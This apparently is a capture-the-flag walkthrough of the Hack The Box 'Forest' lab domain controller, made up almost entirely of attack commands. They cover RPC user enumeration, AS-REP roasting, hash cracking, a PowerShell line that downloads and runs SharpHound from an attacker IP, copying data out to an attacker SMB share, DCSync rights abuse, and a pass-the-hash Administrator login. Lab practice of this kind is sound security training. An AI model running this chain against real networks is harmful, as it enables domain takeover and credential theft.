### Nmap
```text
PORT      STATE SERVICE      REASON  VERSION
53/tcp    open  domain?      syn-ack
88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2022-10-31 04:57:48Z)
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack
593/tcp   open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack
3268/tcp  open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       syn-ack .NET Message Framing
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack Microsoft Windows RPC
49684/tcp open  msrpc        syn-ack Microsoft Windows RPC
49703/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-10-31T05:05:55
|_  start_date: 2022-10-31T04:53:57
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2022-10-30T22:05:51-07:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 12581/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 32753/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 62832/udp): CLEAN (Failed to receive data)
|   Check 4 (port 44587/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h26m49s, deviation: 4h02m29s, median: 6m48s

```

### Enum domain users from RPC
```
# rpcclient -U "" -N $IP
# enumdomusers # ref: https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/

user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

### Get user hash by AS-REP Roasting
```bash
impacket-GetNPUsers -dc-ip $IP htb.local/ -usersfile users.txt -format hashcat
```

### Crack hash
```bash
hashcat -m 18200 -a 0 --force hashes.txt /usr/share/wordlists/rockyou.txt [show]

password:s3rvice
```

### Get shell
```bash
evil-winrm -i $IP -u svc-alfresco -p s3rvice
```

### Collect data with SharpHound
```powershell
IEX (New-Object Net.WebClient).Downloadstring('http://10.10.14.23/SharpHound.ps1'); Invoke-BloodHound -CollectAll
```

### Transfer file
```bash
impacket-smbserver share .

net use * \\10.10.14.23\smb

copy 20221031212017_BloodHound.zip \\10.10.14.23\smb
```

### Import module
```powershell
Powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.6/PowerView.ps1','C:\Users\svc-alfresco\Documents\PowerView.ps1');
Import-Module ./PowerView.ps1;
```

### Exploit DCSync 
```powershell
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco;
$username = "htb\svc-alfresco"; 
$password = "s3rvice";
$secstr = New-Object -TypeName System.Security.SecureString;
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr;
Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

### Get root shell
```bash
evil-winrm -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -i $IP
```
